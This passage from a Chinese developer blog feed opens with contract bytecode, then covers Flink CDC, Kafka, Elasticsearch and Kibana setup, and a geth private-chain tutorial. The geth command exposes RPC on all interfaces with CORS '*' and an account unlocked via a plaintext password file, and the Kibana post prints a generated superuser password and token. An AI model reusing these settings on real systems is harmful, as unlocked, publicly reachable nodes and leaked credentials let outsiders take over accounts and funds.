505050565b6000611c02611bfd84611baf565b611b94565b905082815260208101848484011115611c1e57611c1d611b2f565b5b611c29848285611be0565b509392505050565b600082601f830112611c4657611c45611b2a565b5b8135611c56848260208601611bef565b91505092915050565b600060208284031215611c7557611c74611748565b5b600082013567ffffffffffffffff811115611c9357611c9261174d565b5b611c9f84828501611c31565b91505092915050565b6000819050919050565b611cbb81611ca8565b82525050565b6000602082019050611cd66000830184611cb2565b92915050565b611ce581611951565b82525050565b6000602082019050611d006000830184611cdc565b92915050565b60008060408385031215611d1d57611d1c611748565b5b6000611d2b8582860161179b565b925050602083013567ffffffffffffffff811115611d4c57611d4b61174d565b5b611d5885828601611c31565b9150509250929050565b611d6b81611ca8565b8114611d7657600080fd5b50565b600081359050611d8881611d62565b92915050565b60008060408385031215611da557611da4611748565b5b600083013567ffffffffffffffff811115611dc357611dc261174d565b5b611dcf85828601611c31565b9250506020611de085828601611d79565b9150509250929050565b7f6f776e6572203d207a65726f2061646472657373000000000000000000000000600082015250565b6000611e206014836119de565b9150611e2b82611dea565b602082019050919050565b60006020820190508181036000830152611e4f81611e13565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680611e9d57607f821691505b602082108103611eb057611eaf611e56565b5b50919050565b7f746f6b656e20646f65736e277420657869737400000000000000000000000000600082015250565b6000611eec6013836119de565b9150611ef782611eb6565b602082019050919050565b60006020820190508181036000830152611f1b81611edf565b9050919050565b7f55524c20717565727920666f72206e6f6e6578697374656e7420746f6b656e00600082015250565b6000611f58601f836119de565b9150611f6382611f22565b602082019050919050565b60006020820190508181036000830152611f8781611f4b565b9050919050565b7f6e6f74206f776e6572206f6620746f6b656e0000000000000000000000000000600082015250565b6000611fc46012836119de565b9150611fcf82611f8e565b602082019050919050565b60006020820190508181036000830152611ff381611fb7565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061203482611951565b915061203f83611951565b925082820390508181111561205757612056611ffa565b5b92915050565b600081905092915050565b600061207382611809565b61207d818561205d565b935061208d818560208601611825565b80840191505092915050565b60006120a58284612068565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603160045260246000fd5b600061211982611951565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361214b5761214a611ffa565b5b600182019050919050565b60008190508160005260206000209050919050565b6000815461217881611e85565b612182818661205d565b9450600182166000811461219d57600181146121b2576121e5565b60ff19831686528115158202860193506121e5565b6121bb85612156565b60005b838110156121dd578154818901526001820191506020810190506121be565b838801955050505b50505092915050565b60006121fa828461216b565b915081905092915050565b60008154905061221481611e85565b9050919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b60006008830261227d7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82612240565b6122878683612240565b95508019841693508086168417925050509392505050565b6000819050919050565b60006122c46122bf6122ba84611951565b61229f565b611951565b9050919050565b6000819050919050565b6122de836122a9565b6122f26122ea826122cb565b84845461224d565b825550505050565b600090565b6123076122fa565b6123128184846122d5565b505050565b5b818110156123365761232b6000826122ff565b600181019050612318565b5050565b601f82111561237b5761234c81612156565b61235584612230565b81016020851015612364578190505b61237861237085612230565b830182612317565b50505b505050565b600082821c905092915050565b600061239e60001984600802612380565b1980831691505092915050565b60006123b7838361238d565b9150826002028217905092915050565b8181036123d55750506124ad565b6123de82612205565b67ffffffffffffffff8111156123f7576123f6611b34565b5b6124018254611e85565b61240c82828561233a565b6000601f83116001811461243b5760008415612429578287015490505b61243385826123ab565b8655506124a6565b601f1984166124498761221b565b965061245486612156565b60005b8281101561247c57848901548255600182019150600185019450602081019050612457565b868310156124995784890154612495601f89168261238d565b8355505b6001600288020188555050505b5050505050505b565b7f546f6b656e207769746820746869732055524c20646f6573206e6f742065786960008201527f7374000000000000000000000000000000000000000000000000000000000000602082015250565b600061250b6022836119de565b9150612516826124af565b604082019050919050565b6000602082019050818103600083015261253a816124fe565b9050919050565b61254a82611809565b67ffffffffffffffff81111561256357612562611b34565b5b61256d8254611e85565b61257882828561233a565b600060209050601f8311600181146125ab5760008415612599578287015190505b6125a385826123ab565b86555061260b565b601f1984166125b986612156565b60005b828110156125e1578489015182556001820191506020850194506020810190506125bc565b868310156125fe57848901516125fa601f89168261238d565b8355505b6001600288020188555050505b505050505050565b7f6d696e7420746f207a65726f2061646472657373000000000000000000000000600082015250565b60006126496014836119de565b915061265482612613565b602082019050919050565b600060208201905081810360008301526126788161263c565b9050919050565b7f746f6b656e20616c7265616479206d696e746564000000000000000000000000600082015250565b60006126b56014836119de565b91506126c08261267f565b602082019050919050565b600060208201905081810360008301526126e4816126a8565b9050919050565b60006126f682611951565b915061270183611951565b925082820190508082111561271957612718611ffa565b5b92915050565b7f55524c20736574206f66206e6f6e6578697374656e7420746f6b656e00000000600082015250565b6000612755601c836119de565b91506127608261271f565b602082019050919050565b6000602082019050818103600083015261278481612748565b905091905056fea2646970667358221220fd0c05e9309ea22159cad7faa8357fabed9c609909ccc80bd530d94ef65ccb3d64736f6c63430008130033&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>综合实训调研</title>
    <url>/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<p>由于综合实践项目需要用到Flink CDC、Kafka、ElasticSearch、Kibana、Doris，以下是对这些框架&#x2F;技术的调研</p>
<span id="more"></span>

<h2><span id="flink-cdc">Flink CDC</span></h2><p><a href="https://nightlies.apache.org/flink/flink-cdc-docs-release-3.0/zh/docs/get-started/introduction/">Flink CDC</a> 是一个基于流的数据集成工具，旨在为用户提供一套功能更加全面的编程接口（API）。</p>
<h3><span id="事件">事件</span></h3><p>事件分为DataChangeEvent、SchemaChangeEvent、Flow of Events</p>
<h4><span id="datachangeevent">DataChangeEvent</span></h4><p><em>DataChangeEvent</em> 描述了源中的数据变更。它由 5 个字段组成：</p>
<ul>
<li>Table ID：事件所属的表 ID</li>
<li>Before：数据的前置图像</li>
<li>After：数据的后置图像</li>
<li>Operation type：变更操作的类型</li>
<li>Meta：变更的元数据</li>
</ul>
<p>操作类型字段预定义了 4 种操作类型：</p>
<ul>
<li>插入（Insert）：新数据条目，before &#x3D; null，after &#x3D; 新数据</li>
<li>删除（Delete）：数据删除，before &#x3D; 被删除的数据，after &#x3D; null</li>
<li>更新（Update）：已存在数据的更新，before &#x3D; 变更前的数据，after &#x3D; 变更后的数据</li>
<li>替换（Replace）</li>
</ul>
<h4><span id="schemachangeevent">SchemaChangeEvent</span></h4><p><em>SchemaChangeEvent</em> 描述了外部系统中表结构的更改</p>
<ul>
<li>AddColumnEvent：表中的新列</li>
<li>AlterColumnTypeEvent：列类型的更改</li>
<li>CreateTableEvent：创建新表。也用于描述预发出的 DataChangeEvent 的模式</li>
<li>DropColumnEvent：删除列</li>
<li>RenameColumnEvent：列名更改</li>
</ul>
<h4><span id="事件流">事件流</span></h4><p>如果一个表对框架是新的，则在任何 DataChangeEvent 之前必须发出 CreateTableEvent；如果表的 schema 发生变化，则必须在任何 DataChangeEvent 之前发出 SchemaChangeEvent。</p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/flow-of-events.png" class title="事件流图">

<h3><span id="如何使用-flink-cdc">如何使用 Flink CDC</span></h3><p><a href="https://nightlies.apache.org/flink/flink-cdc-docs-release-3.0/zh/docs/get-started/quickstart/mysql-to-doris/">MySQL 同步到 Doris</a><br>Flink CDC 提供了基于 YAML 格式的用户 API，更适合于数据集成场景。以下是一个 YAML 文件的示例，它定义了一个数据管道(Pipeline)，该Pipeline从 MySQL 捕获实时变更，并将它们同步到 Apache Doris：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source:</span><br><span class="line">  type: mysql</span><br><span class="line">  hostname: localhost</span><br><span class="line">  port: 3306</span><br><span class="line">  username: root</span><br><span class="line">  password: 123456</span><br><span class="line">  tables: app_db.\.*</span><br><span class="line">  server-id: 5400-5404</span><br><span class="line">  server-time-zone: UTC</span><br><span class="line"></span><br><span class="line">sink:</span><br><span class="line">  type: doris</span><br><span class="line">  fenodes: 127.0.0.1:8030</span><br><span class="line">  username: root</span><br><span class="line">  password: &quot;&quot;</span><br><span class="line">  table.create.properties.light_schema_change: true</span><br><span class="line">  table.create.properties.replication_num: 1</span><br><span class="line"></span><br><span class="line">pipeline:</span><br><span class="line">  name: Sync MySQL Database to Doris</span><br><span class="line">  parallelism: 2</span><br></pre></td></tr></table></figure>
<p>源数据库（source）是 MySQL，连接信息包括主机名（localhost）、端口（3306）、用户名（root）、密码（123456）、表（app_db下的所有表）、服务器ID（5400-5404）和服务器时区（UTC）。<br>目标数据库（sink）是 Doris，连接信息包括FE节点（127.0.0.1:8030）、用户名（root）、密码（空字符串，即没有密码）、表创建属性（包括轻量模式变更和复制数等设置）。<br>Pipeline 部分定义了数据同步任务的名称（Sync MySQL Database to Doris）和并行度（2）。</p>
<h2><span id="kafka">Kafka</span></h2><p>Kafka 是由 Linkedin 公司开发的，它是一个分布式的，支持多分区、多副本，基于 Zookeeper 的分布式消息流平台，它同时也是一款开源的基于发布订阅模式的消息引擎系统。</p>
<h3><span id="主要术语">主要术语</span></h3><p>以下文段摘录于 <a href="https://kafka.apache.org/intro">kafka</a> 官方。</p>
<p>An <em>event</em> records the fact that “something happened” in the world or in your business. It is also called record or message in the documentation. When you read or write data to Kafka, you do this in the form of events. Conceptually, an event has a <em>key</em>, <em>value</em>, <em>timestamp</em>, and <em>optional metadata headers</em>.<br>An example：</p>
<ul>
<li>key：“Alice”</li>
<li>value：“向 Bob 支付了 200 美元”</li>
<li>timestamp：“2020 年 6 月 25 日下午 2：06”。</li>
</ul>
<p><em>Producers</em> are those client applications that publish (write) events to Kafka, and <em>consumers</em> are those that subscribe to (read and process) these events. </p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85.png" class title="生产者-消费者模式">

<p>Events are organized and durably stored in <em>topics</em>. A topic is similar to a folder in a filesystem, and the events are the files in that folder. Topics in Kafka are always <strong>multi-producer and multi-subscriber</strong>.</p>
<p>Topics are partitioned, meaning a topic is spread over a number of “buckets” located on different Kafka brokers. </p>
<p>Kafka 保证具有相同 Key 的事件写入被同一分区，读取时按写入顺序读。但是 Kafka <strong>不保证</strong>不同 Partition 获取的信息是有序的，只保证同 Partition 内消息有序。</p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/Kafka.png" class title="分区示意图">

<h3><span id="快速入门-kafka">快速入门 Kafka</span></h3><p><a href="https://kafka.apache.org/quickstart">快速入门</a></p>
<h3><span id="kafka-和-rabbitmq-的区别">Kafka 和 RabbitMQ 的区别</span></h3><table>
<thead>
<tr>
<th>特性</th>
<th>RabbitMQ</th>
<th>Kafka</th>
</tr>
</thead>
<tbody><tr>
<td>架构</td>
<td>RabbitMQ 的架构专为复杂的消息路由而设计。该代理使用推送模型。生产者使用不同的规则向使用者发送消息。</td>
<td>Kafka 使用基于分区的设计进行实时、高吞吐量的流处理。该代理使用拉取模型。生产者向使用者订阅的主题和分区发布消息。</td>
</tr>
<tr>
<td>消息处理</td>
<td>RabbitMQ 代理监控消息使用。此代理会在消息被使用后将其删除。它支持消息优先级。</td>
<td>使用者使用偏移跟踪器跟踪消息检索情况。Kafka 根据保留策略保留消息。其中没有消息优先级。</td>
</tr>
<tr>
<td>性能</td>
<td>RabbitMQ 提供低延迟。它每秒发送数千条消息。</td>
<td>Kafka 每秒可实时传输多达数百万条消息。</td>
</tr>
<tr>
<td>编程语言</td>
<td>RabbitMQ 支持多种语言和旧式协议。</td>
<td>Kafka 的编程语言选择有限。该代理在 TCP 上使用二进制协议进行数据传输。</td>
</tr>
</tbody></table>
<h2><span id="elasticsearch">ElasticSearch</span></h2><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/documents-indices.html">Elasticsearch</a> is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents.</p>
<p>Elasticsearch REST API 支持结构化查询、全文查询和将两者结合在一起的查询的复杂查询 </p>
<p>和普通的数据库模糊搜索不同，<em>Elasticsearch</em> 的模糊搜索是能使用上索引的，所以在大数据场景下搜索速度快；而且，<em>Elasticsearch</em> 的模糊搜索支持排序，只返回排名高的记录；另外，<em>Elasticsearch</em> 的模糊搜索在遇到不太准确的关键字时也能搜出相关结果。</p>
<h2><span id="kibana">Kibana</span></h2><p><a href="https://www.elastic.co/guide/en/kibana/current/introduction.html">Kibana</a> enables you to give shape to your data and navigate the Elastic Stack</p>
<h3><span id="kibana-和-elasticsearch-关系">Kibana 和 ElasticSearch 关系</span></h3><p>Kibana 运行在 Elasticsearch 之上，主要用于分析日志消息。</p>
]]></content>
      <categories>
        <category>学习</category>
        <category>综合实训</category>
      </categories>
  </entry>
  <entry>
    <title>Kibana_on_ES 配置教程</title>
    <url>/2024/05/10/Kibana-on-ES/</url>
    <content><![CDATA[<h2><span id="配置过程">配置过程</span></h2><p>实验环境: Kibana 版本8.7.1, Elasticsearch 版本8.7.1，在 wsl2-ubuntu22.0.4 上部署</p>
<p>作者在启动 Kibana 的时候，遇到了找不到 nodejs 的报错，最后发现是 kibana-x.x.x&#x2F;node 文件权限的问题，只需要用 chmod 755 kibana-x.x.x&#x2F;node 即可</p>
<span id="more"></span>

<h3><span id="es-单节点配置">ES 单节点配置</span></h3><p>修改 config&#x2F;elasticsearch.yml 文件，添加如下内容，ip地址输入本机wsl地址，可以通过 hostname -I 命令活动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cluster.name: es-8.7.1</span><br><span class="line">node.name: es-9201</span><br><span class="line">path.data: ~\elastic\data\9201</span><br><span class="line">path.logs: ~\elastic\logs\9201</span><br><span class="line">network.host: 172.21.168.87</span><br><span class="line">http.port: 9201</span><br><span class="line">transport.port: 9301</span><br></pre></td></tr></table></figure>
<img data-src="/2024/05/10/Kibana-on-ES/1.png" class>

<p>在 kibana-8.7.1&#x2F; 新建 data 和 logs 文件夹</p>
<p>运行启动命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./elastic/elasticsearch-8.7.1/bin/elasticsearch</span><br></pre></td></tr></table></figure>

<p>启动后会在控制台输出账号的密码和用于 kibana 的 enrollment token，先保存下来，待会有用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-------------------------------------------------------------------------------------------------------------------------&gt; Elasticsearch security features have been automatically configured!</span><br><span class="line">-&gt; Authentication is enabled and cluster connections are encrypted.</span><br><span class="line"></span><br><span class="line">-&gt;  Password for the elastic user (reset with `bin/elasticsearch-reset-password -u elastic`):</span><br><span class="line">  rlF=_=7wFIrdNj6Zh9Z2</span><br><span class="line"></span><br><span class="line">-&gt;  HTTP CA certificate SHA-256 fingerprint:</span><br><span class="line">  a15c8cfcb300affed0dbdf73c318339366b8d8ba076657056e6b85170669d0d6</span><br><span class="line"></span><br><span class="line">-&gt;  Configure Kibana to use this cluster:</span><br><span class="line">* Run Kibana and click the configuration link in the terminal when Kibana starts.</span><br><span class="line">* Copy the following enrollment token and paste it into Kibana in your browser (valid for the next 30 minutes):</span><br><span class="line">  eyJ2ZXIiOiI4LjQuMiIsImFkciI6WyIxMjcuMC4wLjE6OTIwMSJdLCJmZ3IiOiJhMTVjOGNmY2IzMDBhZmZlZDBkYmRmNzNjMzE4MzM5MzY2YjhkOGJhMDc2NjU3MDU2ZTZiODUxNzA2NjlkMGQ2Iiwia2V5IjoienFtTmJZTUJfdzhtUUpvajh2TEI6WDlkMVlwenNTcENqWGV4bER4UE5QdyJ9</span><br><span class="line"></span><br><span class="line">-&gt;  Configure other nodes to join this cluster:</span><br><span class="line">* On this node:</span><br><span class="line">  - Create an enrollment token with `bin/elasticsearch-create-enrollment-token -s node`.</span><br><span class="line">  - Uncomment the transport.host setting at the end of config/elasticsearch.yml.</span><br><span class="line">  - Restart Elasticsearch.</span><br><span class="line">* On other nodes:</span><br><span class="line">  - Start Elasticsearch with `bin/elasticsearch --enrollment-token &lt;token&gt;`, using the enrollment token that you generated.</span><br></pre></td></tr></table></figure>

<p>如果没有保存下来、token过期，也可以手动重置</p>
<p>把 ES 启动后，就可以通过以下两条命令重置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 重置密码</span><br><span class="line">./elastic/elasticsearch-8.7.1/bin/elasticsearch-reset-password -u elastic</span><br><span class="line"># 重置 token</span><br><span class="line">./elastic/elasticsearch-8.7.1/bin/elasticsearch-create-enrollment-token -s kibana --url &quot;https://172.21.168.87:9201&quot;</span><br></pre></td></tr></table></figure>

<img data-src="/2024/05/10/Kibana-on-ES/2.png" class>

<img data-src="/2024/05/10/Kibana-on-ES/3.png" class>

<p>配置好ES，就可以通过浏览器访问了(记得要加https)</p>
<img data-src="/2024/05/10/Kibana-on-ES/4.png" class>

<h3><span id="kibana-配置">Kibana 配置</span></h3><p>重开一个 wsl 窗口，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">./kibana-8.7.1/bin/kibana</span><br></pre></td></tr></table></figure>

<p>使用命令行给出的ip和端口访问 kibana</p>
<img data-src="/2024/05/10/Kibana-on-ES/5.png" class>

<p>输入刚刚复制下来的账号密码，就可以成功连接上 kibana</p>
<img data-src="/2024/05/10/Kibana-on-ES/6.png" class>]]></content>
      <categories>
        <category>学习</category>
        <category>综合实训</category>
      </categories>
  </entry>
  <entry>
    <title>一条命令成功搭建以太坊私链</title>
    <url>/2024/05/11/%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<h2><span id="本文亮点">本文亮点</span></h2><p>作者认为，本教程是目前网络上最新且最简单的，“一条命令”指的并不是真的只需一条命令，但是核心命令只有一条</p>
<ul>
<li>最新：网上的教程基本是一年前甚至几年前写的，某些参数和控制台命令已经不能使用</li>
<li>最简单：相较于作者之前写的教程和网上的教程，省去了与 geth console 交互的步骤</li>
</ul>
<p>本文的命令以 Windows 系统为准</p>
<span id="more"></span>

<h2><span id="配置私链">配置私链</span></h2><p>这一步可以参考作者以前的教程：<a href="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/" title="搭建以太坊私链">搭建以太坊私链</a>，到搭建私链前的部分</p>
<h2><span id="搭建私链">搭建私链</span></h2><h3><span id="创造配置文件">创造配置文件</span></h3><p>在不同于以太坊源码的文件路径下创一个文件夹和.json文件，命名为genesis.json</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ./project</span><br><span class="line">mkdir ./project/node1</span><br><span class="line"># 在./project/node1/ 下创建genesis.json</span><br></pre></td></tr></table></figure>

<p>在这个 json 文件下，配置这个私链的参数，注意这里的 “alloc” 字段下的地址，是需要填入 geth account new 新建的用户<br>这里使用的共识机制是 <a href="https://geth.ethereum.org/docs/tools/clef/clique-signing">Clique</a>，</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;chainId&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;homesteadBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip150Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip155Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip158Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;byzantiumBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constantinopleBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;petersburgBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;istanbulBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;berlinBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clique&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;epoch&quot;</span><span class="punctuation">:</span> <span class="number">30000</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;difficulty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;gasLimit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;extradata&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000890fb1799fe7fa4b8e01ccf343e088d946fcd5560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;alloc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;300000&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;14c6ead33b265da463eef7367798ade6aa8e9d12&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;400000&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="初始化链">初始化链</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir node1 init node1/genesis.json</span><br></pre></td></tr></table></figure>
<p>成功后会出现以下提示 (可能会有 Error 信息，可以忽略)</p>


<p>假如出现以下报错，可以删除 .&#x2F;project&#x2F;MyChain&#x2F; 目录下新生成的两个文件夹，只保留 .json 文件</p>


<h3><span id="创建用户">创建用户</span></h3><p>这里要用 geth account new 创建一个用户，用户的信息会存在 &#x2F;project&#x2F;node1&#x2F;keystore 下<br>此处需要输入密码创建用户，要记得这里的密码，待会有用</p>
<h3><span id="启用链">启用链</span></h3><p>此处启用私链，并且开启RPC接口<br>此处就是本文的重点，也就是题目中所说的“一条命令”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir node1 --http --http.addr 0.0.0.0 --http.port 8545 --http.corsdomain &quot;*&quot; --networkid 12345 --mine --miner.etherbase &quot;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot; --allow-insecure-unlock --unlock &quot;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot; --password password.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>http：开启 RPC 接口</li>
<li>http.port：指定端口，默认8545</li>
<li>http.addr ：HTTP-RPC 监听的ip地址，默认localhost</li>
<li>http.corsdomain：跨域请求，”*”为允许所有来源的跨域请求</li>
<li>networkid：指定链的id，以太坊主链id为1</li>
<li>mine：启用挖矿，只有启用了才能打包交易成区块</li>
<li>miner.etherbase：需要显式指定coinbase，这里选刚刚创建的账户</li>
<li>allow-insecure-unlock：这是最重要的一个参数，没有这个参数 unlock 和 http 不能共存</li>
<li>unlock：非交互式解锁账户，选择刚刚创建的账户</li>
<li>password：在 &#x2F;project 下新建 password.txt，把刚刚的密码放到这个文件中，通过这个参数就可以被读取到，而不用交互式输入</li>
</ul>
<p>如果需要创建多节点，有一些参数是需要显式指定的，不同节点这些参数也要不同，否则会报错</p>
<ul>
<li>port：指定链这个程序占用的端口，默认30303</li>
<li>authrpc.port：authenticated APIs的端口，默认8551</li>
<li>ipcpath：默认 \.\pipe\geth.ipc</li>
</ul>
<p>启用成功后，可以发现链已经在挖矿了，此时提交交易可以被顺利执行；而且 http 服务也成功被开启</p>
<img data-src="/2024/05/11/%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/success.png" class>

]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>每日一题考研题——计网(持续更新)</title>
    <url>/2024/05/12/%E8%AE%A1%E7%BD%91/</url>
    <content><![CDATA[<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/1-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/1-2.jpg" class>

<span id="more"></span>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/2-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/2-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/3-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/3-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/4-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/4-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/5-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/5-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/6-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/6-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/7-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/7-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/8-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/8-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/9-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/9-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/10-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/10-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/11-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/11-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/12-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/12-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/13-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/13-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/14-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/14-2.jpg" class>

